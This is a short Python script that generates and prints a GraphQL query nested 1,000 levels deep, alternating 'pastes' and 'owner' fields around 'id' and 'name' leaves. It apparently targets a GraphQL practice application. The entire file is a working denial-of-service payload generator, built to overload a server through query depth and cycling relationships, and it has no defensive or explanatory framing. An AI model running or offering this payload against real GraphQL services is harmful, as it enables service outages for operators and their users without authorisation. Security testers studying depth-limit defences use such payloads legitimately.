# Create 1,000 nested levels
depth = 1000
indent_size = 2

# Build opening structure
opening_lines = []
for i in range(depth):
    current_indent = " " * (i * indent_size)
    opening_lines.append(f"{current_indent}pastes {{")
    opening_lines.append(f"{current_indent}  owner {{")

# Build closing structure
closing_lines = []
for i in range(depth - 1, -1, -1):
    current_indent = " " * (i * indent_size)
    closing_lines.append(f"{current_indent}  }}")
    closing_lines.append(f"{current_indent}}}")

# Innermost leaf fields
leaf_indent = " " * (depth * indent_size)
leaf_fields = f"{leaf_indent}id\n{leaf_indent}name"

# Combine into complete query string
query = "query {\n" + "\n".join(opening_lines) + "\n" + leaf_fields + "\n" + "\n".join(closing_lines) + "\n}"

# Print directly to stdout
print(query)